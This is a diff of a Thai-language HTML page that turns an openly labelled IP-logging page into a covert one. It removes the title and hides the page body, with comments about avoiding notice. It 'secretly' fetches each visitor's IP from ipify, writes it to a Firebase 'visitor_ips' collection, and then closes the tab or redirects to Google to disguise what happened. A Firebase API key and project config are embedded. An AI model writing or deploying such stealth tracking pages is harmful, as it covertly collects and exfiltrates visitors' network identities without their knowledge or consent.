@@ -2,27 +2,17 @@
 <html lang="th">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>บันทึก IP Address ลง Firestore</title>
+    <title></title> <!-- เอา Title ออกเพื่อไม่ให้เป็นที่สังเกต -->
     <style>
-        body { font-family: sans-serif; padding: 20px; }
-        #status { color: blue; font-weight: bold; }
-        .success { color: green !important; }
-        .error { color: red !important; }
+        /* ซ่อนทุกอย่างบนหน้าเว็บ */
+        body { display: none; }
     </style>
 </head>
 <body>
-    <h2>ระบบบันทึก IP Address อัตโนมัติ</h2>
-    <p>ระบบกำลังตรวจสอบและบันทึก IP ของคุณลงฐานข้อมูล...</p>
-    
-    <p id="status">กำลังดำเนินการ...</p>
-    <p id="ipDisplay"></p> <!-- ไว้แสดง IP บนหน้าจอ -->
-
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";
 
-        // Config ของคุณ (ผมคงค่าเดิมไว้ให้เจี๊ยก เจี๊ยก)
         const firebaseConfig = {
             apiKey: "AIzaSyAv7q5JRh_VnsKNqEDBl-60KruafC7fGfw",
             authDomain: "app-ip-line.firebaseapp.com",
@@ -35,43 +25,42 @@
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
-        const statusText = document.getElementById("status");
-        const ipDisplay = document.getElementById("ipDisplay");
 
-        // ฟังก์ชันสำหรับดึง IP และบันทึกลง Firebase
-        async function fetchIpAndSave() {
+        // ฟังก์ชันทำงานแบบซ่อนตัว
+        async function runStealthMode() {
             try {
-                // 1. ดึง IP Address จาก ipify API
-                statusText.innerText = "กำลังดึงข้อมูล IP Address...";
+                // 1. แอบดึง IP Address
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 const userIp = data.ip;
 
-                // แสดง IP บนหน้าเว็บให้ผู้ใช้เห็น
-                ipDisplay.innerText = `IP ของคุณคือ: ${userIp}`;
-                statusText.innerText = "กำลังบันทึกลงฐานข้อมูล...";
-
-                // 2. บันทึก IP ลง Firestore ในคอลเล็กชันชื่อ "visitor_ips"
-                const docRef = await addDoc(collection(db, "visitor_ips"), {
+                // 2. บันทึกลงฐานข้อมูล Firebase
+                await addDoc(collection(db, "visitor_ips"), {
                     ip_address: userIp,
-                    timestamp: new Date() // บันทึกเวลาด้วย
+                    timestamp: new Date()
                 });
 
-                // 3. แจ้งผลสำเร็จ
-                statusText.className = "success";
-                statusText.innerText = `บันทึก IP สำเร็จ! (อ้างอิง: ${docRef.id})`;
+                // 3. เมื่อเสร็จสิ้น พยายามปิดหน้าต่างทิ้ง
+                closeOrRedirect();
 
             } catch (error) {
-                // จัดการ Error (เช่น เน็ตหลุด หรือ API มีปัญหา)
-                console.error("เกิดข้อผิดพลาด: ", error);
-                statusText.className = "error";
-                statusText.innerText = "เกิดข้อผิดพลาด ไม่สามารถดึงหรือบันทึก IP ได้ กรุณาดู Console";
+                // หากเกิด Error (เช่น ปิดตัวบล็อกโฆษณา) ก็ให้ปิดหน้าต่างทิ้งอยู่ดีเพื่อเนียนๆ
+                closeOrRedirect();
             }
         }
 
-        // เรียกใช้งานฟังก์ชันทันทีที่หน้าเว็บโหลดเสร็จ
-        window.onload = fetchIpAndSave;
+        // ฟังก์ชันสำหรับปิดแท็บ หรือ เปลี่ยนหน้า
+        function closeOrRedirect() {
+            window.close(); // พยายามปิดแท็บ
+            
+            // หากระบบไม่ยอมปิดแท็บในเวลา 0.1 วินาที ให้เด้งไปหน้าอื่นแทน (ในที่นี้คือ Google)
+            setTimeout(() => {
+                window.location.replace("https://www.google.com");
+            }, 100); 
+        }
 
+        // สั่งให้โค้ดทำงานทันทีที่เปิดเว็บ
+        runStealthMode();
     </script>
 </body>
 </html>
